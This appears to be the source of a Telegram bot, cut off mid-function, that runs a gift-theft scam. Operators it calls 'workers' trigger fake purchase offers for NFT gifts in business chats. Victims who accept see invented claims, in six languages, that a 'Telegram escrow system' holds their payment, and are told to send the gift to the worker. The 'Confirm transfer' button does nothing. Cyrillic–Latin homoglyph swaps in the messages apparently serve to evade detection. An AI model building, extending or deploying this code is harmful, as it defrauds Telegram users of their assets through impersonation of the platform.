import os
import re
import time
import random
import string
import logging
import asyncio
import sqlite3
from datetime import datetime
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, LinkPreviewOptions
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MASTER_ADMIN_ID = int(os.getenv("MASTER_ADMIN_ID", 0))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не найден в .env")
if not MASTER_ADMIN_ID:
    raise ValueError("MASTER_ADMIN_ID не найден в .env")

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()

offers = {}
BOT_USERNAME = ""

OFFER_TTL_SECONDS = 6 * 3600

# ---------- ЭМОДЗИ ----------
STAR = '<tg-emoji emoji-id="5920433463428650761">⭐</tg-emoji>'
GRAM = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
SOLD = '<tg-emoji emoji-id="6032644646587338669">🎁</tg-emoji>'

ICON_ACCEPT  = "5774022692642492953"
ICON_DECLINE = "5774077015388852135"
ICON_CONFIRM = "5774022692642492953"

STAR_PLAIN = "⭐️"
GRAM_PLAIN = "💎"

# ---------- ГОМОГЛИФЫ ----------
CYR_TO_LAT = {
    'а': 'a', 'с': 'c', 'е': 'e', 'о': 'o', 'р': 'p', 'х': 'x', 'у': 'y',
    'А': 'A', 'В': 'B', 'С': 'C', 'Е': 'E', 'Н': 'H', 'К': 'K', 'М': 'M',
    'О': 'O', 'Р': 'P', 'Т': 'T', 'Х': 'X', 'У': 'Y',
}

LAT_TO_CYR = {
    'a': 'а', 'c': 'с', 'e': 'е', 'o': 'о', 'p': 'р', 'x': 'х', 'y': 'у',
    'A': 'А', 'B': 'В', 'C': 'С', 'E': 'Е', 'H': 'Н', 'K': 'К', 'M': 'М',
    'O': 'О', 'P': 'Р', 'T': 'Т', 'X': 'Х', 'Y': 'У',
}


def _swap(text, mapping):
    parts = re.split(r'(<[^>]+>)', text)
    out = []
    for part in parts:
        if part.startswith('<') and part.endswith('>'):
            out.append(part)
        else:
            out.append(''.join(mapping.get(ch, ch) for ch in part))
    return ''.join(out)


def apply_homoglyphs(text, lang):
    if lang == "ru":
        return _swap(text, CYR_TO_LAT)
    if lang == "en":
        return _swap(text, LAT_TO_CYR)
    return text


def apply_homoglyphs_plain(text, lang):
    if lang == "ru":
        return ''.join(CYR_TO_LAT.get(ch, ch) for ch in text)
    if lang == "en":
        return ''.join(LAT_TO_CYR.get(ch, ch) for ch in text)
    return text


# ---------- БАЗА ----------
conn = sqlite3.connect("offers.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_worker INTEGER DEFAULT 0,
        created_at TEXT
    )
""")
conn.commit()


def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return cursor.fetchone()


def add_user(user_id, username=""):
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?, ?, ?)",
        (user_id, username, datetime.now().isoformat())
    )
    conn.commit()
    if username:
        cursor.execute("UPDATE users SET username = ? WHERE user_id = ? AND (username IS NULL OR username = '')", (username, user_id))
        conn.commit()


def set_worker(user_id, value=1, username=""):
    add_user(user_id, username)
    cursor.execute("UPDATE users SET is_worker = ? WHERE user_id = ?", (value, user_id))
    conn.commit()


def is_worker(user_id):
    u = get_user(user_id)
    return bool(u and u[2] == 1)


def generate_order_id():
    chars = string.ascii_uppercase + string.digits
    return "TG-" + ''.join(random.choices(chars, k=8))


def parse_nft_link(raw):
    raw = raw.strip().replace("https://", "").replace("http://", "")
    m = re.match(r'^t\.me/nft/([A-Za-z]+-\d+)$', raw)
    if not m:
        return None
    nft_id = m.group(1)
    return f"https://t.me/nft/{nft_id}", nft_id


def format_sender_link(username, user_id):
    if username:
        return f"@{username}"
    return f'<a href="tg://user?id={user_id}">{user_id}</a>'


def currency_name_for(lang, currency):
    if currency == "gram":
        return "Gram"
    return "Stars"


# ---------- ФОРМАТ ВРЕМЕНИ ----------
def format_time_left(seconds, lang):
    if seconds < 0:
        seconds = 0
    h = seconds // 3600
    m = (seconds % 3600) // 60
    if lang == "en":
        return f"{h} h. {m} min."
    if lang == "uk":
        return f"{h} год. {m} хв."
    if lang == "ar":
        return f"{h} ساعة {m} دقيقة"
    if lang == "fa":
        return f"{h} ساعت {m} دقیقه"
    if lang == "zh":
        return f"{h} 小时 {m} 分钟"
    return f"{h} ч. {m} мин."


# ---------- ЛОКАЛИ ----------
LOCALES = {
    "ru": {
        "offer": "Пользователь <b>{user_name}</b> предлагает Вам <b>{price_cur}</b> за подарок <b>{nft_link_display}</b>.\n\nПредложение действует еще <b>{time_left}</b>.",
        "accept": "Принять",
        "decline": "Отклонить",
        "declined": "Предложение отклонено",
        "alert_warning": "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        "btn_transfer": "Передать НФТ",
        "btn_confirm": "Подтвердить передачу",
        "accept1_header": "Сделка с NFT",
        "accept1_order": "Заказ",
        "accept1_reserved_stars": f"Покупатель зарезервировал <b>{{price}}</b> {STAR} через гарантийную систему Telegram. Звёзды находятся на специальном счёте удержания и будут автоматически начислены на ваш баланс Telegram Stars сразу после передачи подарка.",
        "accept1_reserved_gram": f"Покупатель зарезервировал <b>{{price}}</b> {GRAM} GRAM через гарантийную систему Telegram. Средства находятся на специальном счёте удержания и будут автоматически начислены на ваш баланс GRAM in Telegram сразу после передачи подарка.",
        "accept1_instructions": "Инструкция для завершения сделки:",
        "accept1_step1": "1. Передайте пользователю: {sender}",
        "accept1_step2": "2. Нажмите «Передать подарок» и выберите {nft}",
        "accept1_step3": "3. Подтвердите передачу подарка.",
        "accept1_final_stars": f"Система Telegram зафиксирует транзакцию и моментально зачислит <b>{{price}}</b> {STAR} на ваш баланс. Резерв действует 24 часа.",
        "accept1_final_gram": f"Система Telegram зафиксирует транзакцию и моментально зачислит <b>{{price}}</b> {GRAM} GRAM на ваш баланс. Резерв действует 24 часа.",
        "accept2_prefix": "Подарок:",
        "accept2_suffix": "успешно продан!",
        "accept2_instruction": "• Передайте подарок покупателю для зачисления {currency_name}.",
    },
    "en": {
        "offer": "User <b>{user_name}</b> offers you <b>{price_cur}</b> for the gift <b>{nft_link_display}</b>.\n\nThe offer is valid for <b>{time_left}</b>.",
        "accept": "Accept",
        "decline": "Decline",
        "declined": "Offer declined",
        "alert_warning": "Attention!\n\nFollow the instructions to avoid losing the gift and receive payment.\n\nClick «OK» if you have read this message.",
        "btn_transfer": "Send NFT",
        "btn_confirm": "Confirm transfer",
        "accept1_header": "NFT Deal",
        "accept1_order": "Order",
        "accept1_reserved_stars": f"The buyer has reserved <b>{{price}}</b> {STAR} through the Telegram escrow system. The stars are held in a special escrow account and will be automatically credited to your Telegram Stars balance right after the gift is transferred.",
        "accept1_reserved_gram": f"The buyer has reserved <b>{{price}}</b> {GRAM} GRAM through the Telegram escrow system. The funds are held in a special escrow account and will be automatically credited to your GRAM in Telegram balance right after the gift is transferred.",
        "accept1_instructions": "Instructions to complete the deal:",
        "accept1_step1": "1. Send to: {sender}",
        "accept1_step2": "2. Click «Send Gift» and select {nft}",
        "accept1_step3": "3. Confirm the gift transfer.",
        "accept1_final_stars": f"Telegram will record the transaction and instantly credit <b>{{price}}</b> {STAR} to your balance. The reservation is valid for 24 hours.",
        "accept1_final_gram": f"Telegram will record the transaction and instantly credit <b>{{price}}</b> {GRAM} GRAM to your balance. The reservation is valid for 24 hours.",
        "accept2_prefix": "Gift:",
        "accept2_suffix": "successfully sold!",
        "accept2_instruction": "• Send the gift to the buyer to receive {currency_name}.",
    },
    "uk": {
        "offer": "Користувач <b>{user_name}</b> пропонує Вам <b>{price_cur}</b> за подарунок <b>{nft_link_display}</b>.\n\nПропозиція діє ще <b>{time_left}</b>.",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "declined": "Пропозицію відхилено",
        "alert_warning": "Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок і отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення.",
        "btn_transfer": "Передати НФТ",
        "btn_confirm": "Підтвердити передачу",
        "accept1_header": "Угода з NFT",
        "accept1_order": "Замовлення",
        "accept1_reserved_stars": f"Покупець зарезервував <b>{{price}}</b> {STAR} через гарантійну систему Telegram. Зірки знаходяться на спеціальному рахунку утримання і будуть автоматично нараховані на ваш баланс Telegram Stars відразу після передачі подарунка.",
        "accept1_reserved_gram": f"Покупець зарезервував <b>{{price}}</b> {GRAM} GRAM через гарантійну систему Telegram. Кошти знаходяться на спеціальному рахунку утримання і будуть автоматично нараховані на ваш баланс GRAM in Telegram відразу після передачі подарунка.",
        "accept1_instructions": "Інструкція для завершення угоди:",
        "accept1_step1": "1. Передайте користувачу: {sender}",
        "accept1_step2": "2. Натисніть «Передати подарунок» і виберіть {nft}",
        "accept1_step3": "3. Підтвердіть передачу подарунка.",
        "accept1_final_stars": f"Система Telegram зафіксує транзакцію і моментально зарахує <b>{{price}}</b> {STAR} на ваш баланс. Резерв діє 24 години.",
        "accept1_final_gram": f"Система Telegram зафіксує транзакцію і моментально зарахує <b>{{price}}</b> {GRAM} GRAM на ваш баланс. Резерв діє 24 години.",
        "accept2_prefix": "Подарунок:",
        "accept2_suffix": "успішно продано!",
        "accept2_instruction": "• Передайте подарунок покупцеві для зарахування {currency_name}.",
    },
    "ar": {
        "offer": "المستخدم <b>{user_name}</b> يقترح عليك <b>{price_cur}</b> مقابل الهدية <b>{nft_link_display}</b>.\n\nالعرض صالح لمدة <b>{time_left}</b>.",
        "accept": "قبول",
        "decline": "رفض",
        "declined": "تم رفض العرض",
        "alert_warning": "تحذير!\n\nاتبع التعليمات لتجنب فقدان الهدية والحصول على الدفع.\n\nاضغط «موافق» إذا قرأت هذه الرسالة.",
        "btn_transfer": "إرسال NFT",
        "btn_confirm": "تأكيد النقل",
        "accept1_header": "صفقة NFT",
        "accept1_order": "الطلب",
        "accept1_reserved_stars": f"قام المشتري بحجز <b>{{price}}</b> {STAR} من خلال نظام الضمان في Telegram. يتم الاحتفاظ بالنجوم في حساب ضمان خاص وسيتم إضافتها تلقائيًا إلى رصيد Telegram Stars الخاص بك مباشرة بعد نقل الهدية.",
        "accept1_reserved_gram": f"قام المشتري بحجز <b>{{price}}</b> {GRAM} GRAM من خلال نظام الضمان في Telegram. يتم الاحتفاظ بالأموال في حساب ضمان خاص وسيتم إضافتها تلقائيًا إلى رصيد GRAM in Telegram الخاص بك مباشرة بعد نقل الهدية.",
        "accept1_instructions": "تعليمات لإتمام الصفقة:",
        "accept1_step1": "1. أرسل إلى: {sender}",
        "accept1_step2": "2. اضغط «إرسال الهدية» واختر {nft}",
        "accept1_step3": "3. أكد نقل الهدية.",
        "accept1_final_stars": f"سيسجل Telegram المعاملة ويضيف فورًا <b>{{price}}</b> {STAR} إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "accept1_final_gram": f"سيسجل Telegram المعاملة ويضيف فورًا <b>{{price}}</b> {GRAM} GRAM إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "accept2_prefix": "الهدية:",
        "accept2_suffix": "تم بيعها بنجاح!",
        "accept2_instruction": "• أرسل الهدية إلى المشتري لاستلام {currency_name}.",
    },
    "fa": {
        "offer": "کاربر <b>{user_name}</b> به شما <b>{price_cur}</b> برای هدیه <b>{nft_link_display}</b> پیشنهاد می‌دهد.\n\nپیشنهاد برای <b>{time_left}</b> معتبر است.",
        "accept": "پذیرش",
        "decline": "رد",
        "declined": "پیشنهاد رد شد",
        "alert_warning": "توجه!\n\nبرای جلوگیری از از دست دادن هدیه و دریافت پرداخت، دستورالعمل را دنبال کنید.\n\nاگر این پیام را خوانده‌اید، «تأیید» را فشار دهید.",
        "btn_transfer": "ارسال NFT",
        "btn_confirm": "تأیید انتقال",
        "accept1_header": "معامله NFT",
        "accept1_order": "سفارش",
        "accept1_reserved_stars": f"خریدار <b>{{price}}</b> {STAR} را از طریق سیستم امانی Telegram رزرو کرده است. ستاره‌ها در یک حساب امانی ویژه نگهداری می‌شوند و بلافاصله پس از انتقال هدیه به‌طور خودکار به موجودی Telegram Stars شما واریز می‌شوند.",
        "accept1_reserved_gram": f"خریدار <b>{{price}}</b> {GRAM} GRAM را از طریق سیستم امانی Telegram رزرو کرده است. وجوه در یک حساب امانی ویژه نگهداری می‌شوند و بلافاصله پس از انتقال هدیه به‌طور خودکار به موجودی GRAM in Telegram شما واریز می‌شوند.",
        "accept1_instructions": "دستورالعمل تکمیل معامله:",
        "accept1_step1": "1. ارسال به: {sender}",
        "accept1_step2": "2. روی «ارسال هدیه» کلیک کنید و {nft} را انتخاب کنید",
        "accept1_step3": "3. انتقال هدیه را تأیید کنید.",
        "accept1_final_stars": f"Telegram تراکنش را ثبت می‌کند و بلافاصله <b>{{price}}</b> {STAR} را به موجودی شما واریز می‌کند. رزرو برای 24 ساعت معتبر است.",
        "accept1_final_gram": f"Telegram تراکنش را ثبت می‌کند و بلافاصله <b>{{price}}</b> {GRAM} GRAM را به موجودی شما واریز می‌کند. رزرو برای 24 ساعت معتبر است.",
        "accept2_prefix": "هدیه:",
        "accept2_suffix": "با موفقیت فروخته شد!",
        "accept2_instruction": "• هدیه را برای دریافت {currency_name} به خریدار ارسال کنید.",
    },
    "zh": {
        "offer": "用户 <b>{user_name}</b> 向您提供 <b>{price_cur}</b> 以换取礼物 <b>{nft_link_display}</b>。\n\n报价有效期 <b>{time_left}</b>。",
        "accept": "接受",
        "decline": "拒绝",
        "declined": "报价已拒绝",
        "alert_warning": "注意！\n\n请按照说明操作，以免丢失礼物并收到付款。\n\n如果您已阅读此消息，请点击「确定」。",
        "btn_transfer": "发送 NFT",
        "btn_confirm": "确认转让",
        "accept1_header": "NFT 交易",
        "accept1_order": "订单",
        "accept1_reserved_stars": f"买家通过 Telegram 担保系统预留了 <b>{{price}}</b> {STAR}。星星存放在专门的托管账户中，礼物转让后将自动记入您的 Telegram Stars 余额。",
        "accept1_reserved_gram": f"买家通过 Telegram 担保系统预留了 <b>{{price}}</b> {GRAM} GRAM。资金存放在专门的托管账户中，礼物转让后将自动记入您的 GRAM in Telegram 余额。",
        "accept1_instructions": "完成交易的说明：",
        "accept1_step1": "1. 发送给：{sender}",
        "accept1_step2": "2. 点击「发送礼物」并选择 {nft}",
        "accept1_step3": "3. 确认礼物转让。",
        "accept1_final_stars": f"Telegram 将记录交易并立即将 <b>{{price}}</b> {STAR} 记入您的余额。预留有效期为 24 小时。",
        "accept1_final_gram": f"Telegram 将记录交易并立即将 <b>{{price}}</b> {GRAM} GRAM 记入您的余额。预留有效期为 24 小时。",
        "accept2_prefix": "礼物：",
        "accept2_suffix": "已成功售出！",
        "accept2_instruction": "• 将礼物发送给买家以接收 {currency_name}。",
    },
}

LANG_CODES = {"ru", "en", "uk", "ar", "fa", "zh"}
VARIANTS = {"1", "2"}


# ---------- ХЕЛПЕРЫ ----------
def build_price_cur(price, currency):
    if currency == "stars":
        return f"{price} {STAR}"
    return f"{price} {GRAM} GRAM"


def build_offer_text(lang, price, currency, nft_id, nft_link, user_name, time_left_sec):
    L = LOCALES[lang]
    top_anchor = f'<a href="{nft_link}">&#8203;</a>'
    nft_link_display = f'<a href="{nft_link}">{nft_id}</a>'
    price_cur = build_price_cur(price, currency)
    time_left = format_time_left(time_left_sec, lang)
    raw = top_anchor + L["offer"].format(
        user_name=user_name,
        price_cur=price_cur,
        nft_link_display=nft_link_display,
        time_left=time_left,
    )
    return apply_homoglyphs(raw, lang)


def build_offer_kb(lang, offer_id):
    L = LOCALES[lang]
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["decline"], lang),
            callback_data=f"r_{offer_id}",
            icon_custom_emoji_id=ICON_DECLINE
        ),
        InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["accept"], lang),
            callback_data=f"a_{offer_id}",
            icon_custom_emoji_id=ICON_ACCEPT
        ),
    ]])


def build_accept_text(lang, variant, nft_id, nft_link, currency, price, sender_display, order_id):
    L = LOCALES[lang]
    nft_link_display = f'<a href="{nft_link}">{nft_id}</a>'
    currency_name = currency_name_for(lang, currency)

    if variant == "2":
        raw = (
            f"{SOLD} {L['accept2_prefix']} <b>{nft_link_display}</b> {L['accept2_suffix']}\n\n"
            f"<b>{L['accept2_instruction'].format(currency_name=currency_name)}</b>"
        )
    else:
        reserved = L["accept1_reserved_stars"] if currency == "stars" else L["accept1_reserved_gram"]
        final = L["accept1_final_stars"] if currency == "stars" else L["accept1_final_gram"]
        raw = (
            f"<b>{L['accept1_header']}</b>\n\n"
            f"{L['accept1_order']} <b>#{order_id}</b>\n\n"
            f"{reserved.format(price=price)}\n\n"
            f"<b>{L['accept1_instructions']}</b>\n\n"
            f"{L['accept1_step1'].format(sender=sender_display)}\n"
            f"{L['accept1_step2'].format(nft=nft_link_display)}\n"
            f"{L['accept1_step3']}\n\n"
            f"{final.format(price=price)}"
        )

    return apply_homoglyphs(raw, lang)


def build_accept_kb(lang, worker_username, worker_id):
    L = LOCALES[lang]
    transfer_target = worker_username if worker_username else ""
    if transfer_target:
        transfer_btn = InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["btn_transfer"], lang),
            url=f"tg://send_gift?to={transfer_target}",
            icon_custom_emoji_id=ICON_ACCEPT
        )
    else:
        transfer_btn = InlineKeyboardButton(
            text=apply_homoglyphs_plain(L["btn_transfer"], lang),
            url=f"tg://user?id={worker_id}",
            icon_custom_emoji_id=ICON_ACCEPT
        )

    confirm_btn = InlineKeyboardButton(
        text=apply_homoglyphs_plain(L["btn_confirm"], lang),
        callback_data="confirm_stub",
        icon_custom_emoji_id=ICON_CONFIRM
    )

    return InlineKeyboardMarkup(inline_keyboard=[[transfer_btn], [confirm_btn]])


# ---------- ТАЙМЕР ----------
async def timer_loop(offer_id):
    try:
        while True:
            await asyncio.sleep(60)
            offer = offers.get(offer_id)
            if not offer:
                return
            if offer.get("finished"):
                return

            now = time.time()
            time_left = int(offer["expires_at"] - now)

            if time_left <= 0:
                try:
                    await bot.delete_business_messages(
                        business_connection_id=offer["business_connection_id"],
                        message_ids=[offer["offer_message_id"]]
                    )
                    logging.info(f">>> OFFER EXPIRED, deleted {offer_id}")
                except Exception as e:
                    logging.error(f"Не удалось удалить истекший оффер: {e}")
                offers.pop(offer_id, None)
                return

            lang = offer["lang"]
            new_text = build_offer_text(
                lang, offer["price"], offer["currency"],
                offer["nft_id"], offer["nft_link"],
                offer["worker_name"], time_left
            )
            kb = build_offer_kb(lang, offer_id)

            try:
                await bot.edit_message_text(
                    chat_id=offer["chat_id"],
                    message_id=offer["offer_message_id"],
                    business_connection_id=offer["business_connection_id"],
                    text=new_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    link_preview_options=LinkPreviewOptions(
                        is_disabled=False, prefer_large_media=True, show_above_text=True
                    )
                )
            except Exception as e:
                logging.error(f"Не удалось обновить таймер: {e}")
                return
    except asyncio.CancelledError:
        return


# ---------- FSM ----------
class GrantStates(StatesGroup):
    waiting_id = State()


# ---------- БИЗНЕС ----------
@router.business_connection()
async def on_business_connection(conn: BusinessConnection):
    try:
        owner_id = conn.user.id
        owner_username = conn.user.username or ""
        add_user(owner_id, owner_username)
        logging.info(f">>> BUSINESS CONNECTION: id={conn.id} user={owner_id} enabled={conn.is_enabled}")
    except Exception as e:
        logging.error(f"business_connection error: {e}")


@router.business_message()
async def on_business_message(message: Message, state: FSMContext):
    if not message.from_user:
        return

    text = (message.text or "").strip()
    conn_id = message.business_connection_id
    logging.info(f">>> BIZ MSG: from={message.from_user.id} text={text!r} biz={conn_id}")

    if not text.startswith(".offer"):
        return

    worker_id = message.from_user.id
    worker_username = message.from_user.username or ""
    worker_first_name = message.from_user.first_name or ""
    add_user(worker_id, worker_username)

    try:
        await bot.delete_business_messages(
            business_connection_id=conn_id,
            message_ids=[message.message_id]
        )
        logging.info(f">>> DELETED .offer msg_id={message.message_id}")
    except Exception as e:
        logging.error(f"Не удалось удалить .offer: {e}")

    if not is_worker(worker_id):
        logging.info(f"Non-worker {worker_id} tried .offer")
        return

    parts = text.split()
    if len(parts) < 5:
        await _notify_worker(
            worker_id,
            "❌ Формат: <code>.offer t.me/nft/Name-123 500 stars ru 1</code>\n"
            "Языки: ru, en, uk, ar, fa, zh\n"
            "Валюты: stars, gram\n"
            "Вариант (необязательно): 1 — большой текст, 2 — короткий (по умолч. 1)"
        )
        return

    parsed = parse_nft_link(parts[1])
    if not parsed:
        await _notify_worker(worker_id, "❌ Неверная ссылка на NFT. Пример: t.me/nft/ChillFlame-101210")
        return
    nft_link, nft_id = parsed

    try:
        price = int(parts[2])
        if price <= 0:
            raise ValueError
    except ValueError:
        await _notify_worker(worker_id, "❌ Сумма должна быть положительным числом.")
        return

    currency = parts[3].lower().strip()
    if currency not in ("stars", "gram"):
        await _notify_worker(worker_id, "❌ Валюта: stars или gram.")
        return

    lang = parts[4].lower().strip()
    if lang not in LANG_CODES:
        await _notify_worker(worker_id, f"❌ Язык не поддерживается. Доступно: {', '.join(sorted(LANG_CODES))}")
        return

    if len(parts) >= 6:
        variant = parts[5].strip()
        if variant not in VARIANTS:
            await _notify_worker(worker_id, "❌ Вариант должен быть 1 или 2. По умолчанию используется 1.")
            variant = "1"
    else:
        variant = "1"

    if worker_first_name:
        worker_name = worker_first_name
    elif worker_username:
        worker_name = f"@{worker_username}"
    else:
        worker_name = f"ID {worker_id}"

    offer_id = generate_order_id()
    now = time.time()

    offer_text = build_offer_text(
        lang, price, currency, nft_id, nft_link,
        worker_name, OFFER_TTL_SECONDS
    )
    kb = build_offer_kb(lang, offer_id)

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            business_connection_id=conn_id,
            parse_mode="HTML",
            reply_markup=kb,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True
            )
        )
    except Exception as e:
        logging.error(f"Не удалось отправить оффер: {e}")
        await _notify_worker(worker_id, f"❌ Ошибка отправки оффера: {e}")
        return

    offers[offer_id] = {
        "nft_link": nft_link,
        "nft_id": nft_id,
        "price": price,
        "currency": currency,
        "lang": lang,
        "variant": variant,
        "worker_id": worker_id,
        "worker_username": worker_username,
        "worker_name": worker_name,
        "business_connection_id": conn_id,
        "chat_id": message.chat.id,
        "offer_message_id": sent.message_id,
        "created_at": now,
        "expires_at": now + OFFER_TTL_SECONDS,
        "finished": False,
        "timer_task": None,
    }

    task = asyncio.create_task(timer_loop(offer_id))
    offers[offer_id]["timer_task"] = task
    logging.info(f">>> OFFER CREATED id={offer_id} variant={variant} lang={lang}")


async def _notify_worker(worker_id, text):
    try:
        await bot.send_message(worker_id, text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Не удалось уведомить воркера {worker_id}: {e}")


def _cancel_timer(offer):
    task = offer.get("timer_task")
    if task and not task.done():
        task.cancel()


# ---------- CALLBACK ----------
@router.callback_query(F.data.startswith("r_"))
async def cb_decline(callback: CallbackQuery):
    offer_id = callback.data[2:]
    offer = offers.get(offer_id)
    if not offer:
        await callback.answer("❌ Оффер не найден", show_alert=True)
        return
    offer["finished"] = True
    _cancel_timer(offer)
    lang = offer["lang"]
    msg = LOCALES[lang]["declined"]
    await callback.answer(msg, show_alert=True)
    try:
        await bot.edit_message_reply_markup(
            chat_id=offer["chat_id"],
            message_id=offer["offer_message_id"],
            business_connection_id=offer["business_connection_id"],
            reply_markup=None
        )
    except Exception as e:
        logging.error(f"Не удалось убрать кнопки: {e}")


@router.callback_query(F.data.startswith("a_"))
async def cb_accept(callback: CallbackQuery):
    offer_id = callback.data[2:]
    offer = offers.get(offer_id)
    if not offer:
        await callback.answer("❌ Offer not found", show_alert=True)
        return

    offer["finished"] = True
    _cancel_timer(offer)

    lang = offer["lang"]
    variant = offer.get("variant", "1")
    nft_id = offer["nft_id"]
    nft_link = offer["nft_link"]
    currency = offer["currency"]
    price = offer["price"]
    worker_username = offer.get("worker_username", "")
    worker_id = offer.get("worker_id", 0)
    conn_id = offer["business_connection_id"]
    chat_id = offer["chat_id"]
    old_msg_id = offer["offer_message_id"]

    L = LOCALES[lang]

    worker_nick = f"@{worker_username}" if worker_username else f"ID {worker_id}"
    alert_text = f"{worker_nick}\n\n{L['alert_warning']}"
    await callback.answer(alert_text, show_alert=True)

    sender_display = format_sender_link(worker_username, worker_id)
    order_id = generate_order_id()

    new_text = build_accept_text(
        lang, variant, nft_id, nft_link, currency,
        price, sender_display, order_id
    )
    kb = build_accept_kb(lang, worker_username, worker_id)

    # Вариант 1 — превью снизу; вариант 2 — превью сверху
    show_above = (variant == "2")
    lpo = LinkPreviewOptions(
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=show_above
    )

    # --- РУССКИЙ: сначала отправляем новое, только потом удаляем старое ---
    if lang == "ru":
        try:
            sent = await bot.send_message(
                chat_id=chat_id,
                text=new_text,
                business_connection_id=conn_id,
                parse_mode="HTML",
                reply_markup=kb,
                link_preview_options=lpo
            )
            offer["offer_message_id"] = sent.message_id
            logging.info(f">>> ACCEPT (ru, v{variant}): sent new {sent.message_id}")

            try:
                await bot.delete_business_messages(
                    business_connection_id=conn_id,
                    message_ids=[old_msg_id]
                )
                logging.info(f">>> ACCEPT (ru): deleted old {old_msg_id}")
            except Exception as e:
                logging.error(f"Не удалось удалить старое сообщение: {e}")
            return
        except Exception as e:
            logging.error(f"Не удалось отправить новое (ru), fallback на edit: {e}")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=old_msg_id,
                    business_connection_id=conn_id,
                    text=new_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    link_preview_options=lpo
                )
                logging.info(f">>> ACCEPT (ru fallback, v{variant}): edited {old_msg_id}")
            except Exception as e2:
                logging.error(f"Fallback edit тоже упал: {e2}")
            return

    # --- ОСТАЛЬНЫЕ ЯЗЫКИ: редактируем ---
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=old_msg_id,
            business_connection_id=conn_id,
            text=new_text,
            parse_mode="HTML",
            reply_markup=kb,
            link_preview_options=lpo
        )
        logging.info(f">>> ACCEPT ({lang}, v{variant}): edited message {old_msg_id}")
    except Exception as e:
        logging.error(f"Не удалось отредактировать оффер: {e}")


@router.callback_query(F.data == "confirm_stub")
async def cb_confirm_stub(callback: CallbackQuery):
    await callback.answer()


# ---------- АДМИНКА ----------
def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список воркеров", callback_data="adm_list")],
        [InlineKeyboardButton(text="➕ Выдать права", callback_data="adm_grant")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm_stats")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm_refresh")],
    ])


async def show_admin_panel(target, edit=False):
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers_count = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]

    text = (
        "🛡 <b>Админ-панель</b>\n\n"
        f"👥 Всего: <b>{total_users}</b>\n"
        f"🟢 Воркеров: <b>{workers_count}</b>\n"
        f"📦 Офферов в кэше: <b>{len(offers)}</b>\n"
        f"🤖 Бот: @{BOT_USERNAME}"
    )
    if edit and isinstance(target, CallbackQuery):
        await target.message.edit_text(text, parse_mode="HTML", reply_markup=admin_kb())
    else:
        msg = target if isinstance(target, Message) else target.message
        await msg.answer(text, parse_mode="HTML", reply_markup=admin_kb())


@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ Доступ запрещён.")
        return
    await show_admin_panel(message)


@router.callback_query(F.data == "adm_refresh")
async def adm_refresh(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await show_admin_panel(cb, edit=True)
    await cb.answer()


@router.callback_query(F.data == "adm_stats")
async def adm_stats(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    users = cursor.fetchone()[0]
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{users}</b>\n"
        f"🟢 Воркеров: <b>{workers}</b>\n"
        f"📦 Офферов: <b>{len(offers)}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")]])
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()


def build_workers_kb():
    cursor.execute("SELECT user_id, username FROM users WHERE is_worker = 1 ORDER BY created_at DESC LIMIT 50")
    workers = cursor.fetchall()
    rows = []
    for w in workers:
        uid, uname = w[0], w[1] or ""
        label = f"❌ @{uname}" if uname else f"❌ {uid}"
        rows.append([InlineKeyboardButton(text=label, callback_data=f"rm_{uid}")])
    rows.append([InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def render_workers_list(cb: CallbackQuery):
